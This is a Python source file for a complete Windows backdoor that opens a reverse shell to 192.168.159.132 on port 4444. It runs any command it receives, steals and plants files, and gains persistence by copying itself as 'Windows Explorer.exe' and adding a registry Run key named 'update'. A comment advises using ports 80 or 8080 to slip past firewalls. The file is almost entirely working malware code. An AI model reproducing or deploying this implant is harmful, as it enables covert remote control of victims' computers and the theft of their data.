#!usr/bin/env python

import socket, subprocess, json, os, base64, sys, time, shutil

def main():
    try:
        backdoor = Backdoor('192.168.159.132', 4444)
        backdoor.start()
    except Exception:
        time.sleep(60)
        main()

class Backdoor:

    def __init__(self, IP, socket):
        self.become_persistent()
        self.IP = IP
        self.socket = socket

    def become_persistent(self):
        file_new_location = os.environ["appdata"] + r"\\Windows Explorer.exe"
        if not os.path.exists(file_new_location):
            shutil.copy(sys.executable, file_new_location)
            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{file_new_location}"', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def execute_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recieve(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_dir(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def read_file(self, name):
        with open(name, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, name, content):
        with open(name, 'wb') as file:
            file.write(base64.b64decode(content))
            return "good transfer"
    
    def start(self):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #could be good to use common ports here like 80 or 8080 to not trigger firewall
            self.connection.connect((self.IP, self.socket))
            self.reliable_send('\n[+] Connection established.')

            while True:
                command = self.reliable_recieve()
                command_result = ''
                try:
                    if command[0] == 'exit':
                        self.connection.close()
                        sys.exit()
                    if command[0] == 'cd' and len(command) > 1:
                        command_result = self.change_working_dir(command[1])
                    if command[0] == 'download' and len(command) > 1:
                        command_result = self.read_file(command[1]).decode()
                    if command[0] == 'upload' and len(command) > 1:
                        self.write_file(command[1], command[2])
                        command_result = 'good transfer'
                    if command_result == '':
                        command_result = self.execute_command(command).decode()
                    self.reliable_send(command_result)
                except Exception as e:
                    command_result = f'[-] Error in command execution target-side: {str(e)}'
                    self.reliable_send(command_result)
                    continue
        except KeyboardInterrupt:
            self.connection.close()
            print('\n[+] Connection closed. Exiting...')
            exit()

if __name__ == '__main__':
    main()